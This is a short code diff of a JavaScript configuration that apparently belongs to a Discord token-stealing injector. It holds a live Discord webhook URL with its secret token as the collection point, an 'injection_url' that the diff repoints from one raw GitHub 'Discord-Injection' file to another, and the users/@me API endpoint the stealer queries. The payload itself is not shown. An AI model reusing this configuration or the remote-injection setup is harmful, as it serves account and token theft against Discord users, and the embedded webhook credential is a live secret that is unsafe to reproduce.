@@ -14,7 +14,7 @@ const config = {
     embed_icon: "https://cdn.discordapp.com/attachments/933873181813526541/1026926926297837639/unknown.png",
     embed_color: 8363488,
     webhook: "https://discord.com/api/webhooks/1022142100717961226/0JMe4jR89_40NHZJ5E4bTy3eYEfmOE9gzykA8UFix_QXQWRQ9DmX6XdGsIdSwDRPBcWR",
-    injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/Discord-Injection/main/file.js",
+    injection_url: "https://raw.githubusercontent.com/Spaceish/Discord-InjectionMeow-/main/file.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v9/users/@me",
     nitro: {
